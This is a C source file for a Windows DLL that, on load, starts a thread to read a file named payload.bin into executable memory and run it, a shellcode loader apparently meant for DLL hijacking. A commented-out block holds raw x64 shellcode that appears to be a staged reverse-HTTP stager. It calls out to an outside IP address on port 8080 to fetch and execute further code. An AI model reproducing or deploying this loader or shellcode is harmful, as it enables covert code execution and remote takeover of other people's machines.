
#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    //https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
    
    //execute shellcode
    /*
    unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x90\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x4a\x56\x64\x59\x00\xa4\x98\xf0\x80\xd5\x64\xcd\x8e\x64\x1b\x01\xba\xaf\xa8\x54\xdf\xc2\xf0\x90\x0d\x28\x00\x72\xac\x27\x1e\x0b\x39\x47\xa2\x75\xb4\xac\xdd\x99\x57\x3b\x69\xc0\x3a\xac\x03\x08\x8a\x90\x0b\x4b\x0f\x5d\xf8\x67\x80\xe2\xae\xc8\xc2\x72\x84\xd0\x36\xd4\x09\xc6\x54\xb8\x11\xab\x3f\xad\x69\x61\x2a\xad\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x58\x41\x29\x0d\x0a\x00\x37\x64\xea\xef\x35\x7a\x14\x67\x65\xab\x6a\x25\x8c\x9d\x9f\x9b\xea\x7b\x12\x08\xa3\xef\x99\x85\x6c\x7f\x4b\xa1\x79\xa2\x5c\xb3\x32\xd7\x18\xcf\x8a\xd4\xb9\x8e\xfb\x6d\xc9\xb9\x81\x62\x32\x53\xe2\xda\x2e\x7a\x3a\xbc\x99\x9a\xd5\xb1\xc9\x9f\x8d\xe5\xb6\x03\xb5\xfd\xa8\x91\x53\x6d\x9b\x04\x3b\xc1\x66\xc7\x3c\x54\x13\x39\xbe\xa0\x77\xba\x4a\xe0\x1b\xea\x3c\xd2\x79\xf6\xbe\xeb\x37\x47\x5e\xc0\x84\x08\x9f\xb9\x4e\x95\x8f\xf5\x17\x73\x86\x4e\x65\xb2\x26\x48\x89\xf3\x36\xa1\x30\xa0\x74\x57\x0b\x6a\x23\x71\xf0\x11\x97\x0f\x13\x77\xc5\x27\xe1\x6f\x25\x84\x38\xb0\x78\x24\xd2\xd6\x76\xfe\x06\x1f\xa3\xe9\xae\x09\x0e\x84\xa0\x9f\x87\xb6\x2b\x7e\xd6\x41\x9a\x59\x16\x6a\xe7\xab\x96\x64\x38\x0c\x13\x6c\x05\x90\xe0\x13\x64\x90\xb3\x77\xee\xe2\xf0\xba\x0f\xce\x24\x10\xd0\x52\xb1\xf0\x17\x8e\xb9\xe2\xfa\xb9\x80\x98\x22\x1b\x11\x9b\x16\xe4\x8c\xf4\xdd\x92\x9a\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x37\x2e\x39\x34\x2e\x32\x30\x2e\x32\x30\x39\x00\x49\x96\x02\xd2";
    
    void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buf, sizeof(buf));
    */
   // execute payload.bin
    FILE* fp;
    size_t size;
    unsigned char* buffer;

    fp = fopen("C:\\Users\\test.WIN2019\\Desktop\\payload.bin", "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);

    //https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
    fread(buffer, size, 1, fp);

    void* exec = VirtualAlloc(0,size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(exec, buffer, size);

    ((void(*) ())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 

       // MessageBox(NULL, L"aaa", L"Even Dlg title", MB_OK);
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



